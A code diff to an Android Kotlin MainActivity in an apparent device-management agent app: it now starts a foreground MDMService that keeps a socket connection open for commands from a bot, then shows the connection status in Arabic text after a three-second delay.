@@ -87,11 +87,38 @@ class MainActivity : AppCompatActivity() {
             Log.e(TAG, "Failed to register receiver: ${e.message}")
         }
 
-        // Connect to server IMMEDIATELY
-        connectToServer()
+        // ✅ Start MDMService immediately - this is what keeps SocketManager connected
+        // and allows the app to receive commands from the bot.
+        // MDMService creates its own SocketManager and CommandHandler.
+        // MainActivity should NOT create a separate SocketManager (would cause duplicate connections).
+        try {
+            val serviceIntent = Intent(this, com.mdm.agent.service.MDMService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent)
+            } else {
+                startService(serviceIntent)
+            }
+            Log.i(TAG, "✅ MDMService started from MainActivity")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to start MDMService: ${e.message}")
+        }
 
-        // Show the main screen (permissions + accessibility button)
+        // ✅ MDMService will create the SocketManager. MainActivity just waits
+        // for it to be set via setSocketManager() call from MDMService.
+        // For now, show the main screen.
         showMainScreen()
+
+        // Try to get the SocketManager from MDMService (it may already be set)
+        Handler(Looper.getMainLooper()).postDelayed({
+            val sm = getSocketManager()
+            if (sm != null) {
+                Log.i(TAG, "✅ SocketManager available from MDMService: ${sm.isConnected}")
+                updateStatus(if (sm.isConnected) "✅ متصل بالسيرفر" else "⏳ جاري الاتصال...")
+            } else {
+                Log.w(TAG, "⚠️ SocketManager not yet available - MDMService may still be starting")
+                updateStatus("⏳ جاري الاتصال بالسيرفر...")
+            }
+        }, 3000)
     }
 
     override fun onDestroy() {
